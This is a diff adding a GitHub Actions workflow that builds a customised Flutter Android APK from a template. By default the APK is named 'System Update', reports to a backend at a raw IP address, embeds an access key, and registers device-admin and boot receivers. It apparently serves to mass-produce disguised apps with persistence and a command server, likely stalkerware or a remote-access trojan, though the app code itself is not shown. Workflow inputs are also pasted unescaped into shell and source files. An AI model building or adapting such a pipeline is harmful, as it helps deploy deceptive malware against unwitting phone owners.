@@ -1,0 +1,175 @@
+name: Build Custom APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      app_name:
+        description: 'App Name'
+        required: true
+        default: 'System Update'
+      package_name:
+        description: 'Package Name (com.xxx.yyy)'
+        required: true
+        default: 'com.system.update'
+      icon_url:
+        description: 'Icon URL (PNG, 512x512)'
+        required: false
+        default: ''
+      webview_url:
+        description: 'WebView URL'
+        required: true
+        default: 'https://www.google.com'
+      access_key:
+        description: 'User Access Key'
+        required: true
+        default: ''
+      server_url:
+        description: 'Backend Server URL'
+        required: false
+        default: 'http://78.154.103.11:3000'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Java 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'zulu'
+          java-version: '17'
+
+      - name: Setup Flutter
+        uses: subosito/flutter-action@v2
+        with:
+          flutter-version: '3.24.3'
+          channel: 'stable'
+          cache: true
+
+      - name: Prepare build directory
+        run: |
+          cp -r template-app build-app
+          cd build-app
+
+      - name: Update package name
+        run: |
+          cd build-app
+          PKG="${{ github.event.inputs.package_name }}"
+          PKG_PATH=$(echo "$PKG" | tr '.' '/')
+
+          # Update AndroidManifest.xml
+          sed -i "s|package=\"[^\"]*\"|package=\"$PKG\"|g" android/app/src/main/AndroidManifest.xml
+          sed -i "s|android:label=\"[^\"]*\"|android:label=\"${{ github.event.inputs.app_name }}\"|g" android/app/src/main/AndroidManifest.xml
+
+          # Update build.gradle
+          sed -i "s|namespace = \"[^\"]*\"|namespace = \"$PKG\"|g" android/app/build.gradle
+          sed -i "s|applicationId = \"[^\"]*\"|applicationId = \"$PKG\"|g" android/app/build.gradle
+
+          # Update strings.xml
+          cat > android/app/src/main/res/values/strings.xml << EOF
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">${{ github.event.inputs.app_name }}</string>
+          </resources>
+          EOF
+
+          # Rename Kotlin package folder
+          OLD_PATH="android/app/src/main/kotlin/com/template/app"
+          NEW_PATH="android/app/src/main/kotlin/$PKG_PATH"
+          mkdir -p "$NEW_PATH"
+          mv $OLD_PATH/*.kt "$NEW_PATH/" || true
+          sed -i "s|package com.template.app|package $PKG|g" "$NEW_PATH"/*.kt
+
+          echo "Package: $PKG"
+          echo "Path: $NEW_PATH"
+
+      - name: Update MainActivity reference in manifest
+        run: |
+          cd build-app
+          PKG="${{ github.event.inputs.package_name }}"
+          # Ganti .MainActivity jadi full path
+          sed -i "s|android:name=\".MainActivity\"|android:name=\"$PKG.MainActivity\"|g" android/app/src/main/AndroidManifest.xml
+          sed -i "s|android:name=\".MyDeviceAdminReceiver\"|android:name=\"$PKG.MyDeviceAdminReceiver\"|g" android/app/src/main/AndroidManifest.xml
+          sed -i "s|android:name=\".BootReceiver\"|android:name=\"$PKG.BootReceiver\"|g" android/app/src/main/AndroidManifest.xml
+
+      - name: Inject build config
+        run: |
+          cd build-app
+          mkdir -p lib/config
+          cat > lib/config/build_config.dart << 'EOF'
+          // AUTO-GENERATED — JANGAN EDIT MANUAL
+          class BuildConfig {
+            static const String appName = '${{ github.event.inputs.app_name }}';
+            static const String packageName = '${{ github.event.inputs.package_name }}';
+            static const String webviewUrl = '${{ github.event.inputs.webview_url }}';
+            static const String accessKey = '${{ github.event.inputs.access_key }}';
+            static const String serverUrl = '${{ github.event.inputs.server_url }}';
+            static const String buildId = '${{ github.run_id }}';
+            static const String builtBy = '${{ github.actor }}';
+            static const String builtAt = '${{ github.event.repository.updated_at }}';
+          }
+          EOF
+
+      - name: Download custom icon
+        if: github.event.inputs.icon_url != ''
+        run: |
+          cd build-app
+          ICON_URL="${{ github.event.inputs.icon_url }}"
+          echo "Downloading icon: $ICON_URL"
+
+          # Install imagemagick for resizing
+          sudo apt-get install -y imagemagick
+
+          # Download
+          curl -L --max-time 30 -o /tmp/icon.png "$ICON_URL" || echo "Download failed"
+
+          if [ -f /tmp/icon.png ]; then
+            # Resize ke berbagai ukuran
+            convert /tmp/icon.png -resize 48x48 android/app/src/main/res/mipmap-mdpi/ic_launcher.png
+            convert /tmp/icon.png -resize 72x72 android/app/src/main/res/mipmap-hdpi/ic_launcher.png
+            convert /tmp/icon.png -resize 96x96 android/app/src/main/res/mipmap-xhdpi/ic_launcher.png
+            convert /tmp/icon.png -resize 144x144 android/app/src/main/res/mipmap-xxhdpi/ic_launcher.png
+            convert /tmp/icon.png -resize 192x192 android/app/src/main/res/mipmap-xxxhdpi/ic_launcher.png
+            echo "Icon resized & installed"
+          else
+            echo "Icon download failed, using default"
+          fi
+
+      - name: Flutter pub get
+        run: |
+          cd build-app
+          flutter pub get
+
+      - name: Build APK
+        run: |
+          cd build-app
+          flutter build apk --release --target-platform android-arm64 --no-tree-shake-icons
+
+      - name: Rename APK
+        run: |
+          cd build-app
+          APP_NAME_SAFE=$(echo "${{ github.event.inputs.app_name }}" | tr ' ' '_' | tr -cd '[:alnum:]_-')
+          mv build/app/outputs/flutter-apk/app-release.apk \
+             "build/app/outputs/flutter-apk/${APP_NAME_SAFE}.apk"
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ github.event.inputs.app_name }}-${{ github.run_id }}
+          path: build-app/build/app/outputs/flutter-apk/*.apk
+          retention-days: 14
+
+      - name: Summary
+        run: |
+          echo "## ✅ APK Build Success" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "- **App Name**: ${{ github.event.inputs.app_name }}" >> $GITHUB_STEP_SUMMARY
+          echo "- **Package**: ${{ github.event.inputs.package_name }}" >> $GITHUB_STEP_SUMMARY
+          echo "- **WebView URL**: ${{ github.event.inputs.webview_url }}" >> $GITHUB_STEP_SUMMARY
+          echo "- **Build ID**: ${{ github.run_id }}" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "Download APK dari tab **Artifacts** di halaman ini." >> $GITHUB_STEP_SUMMARY
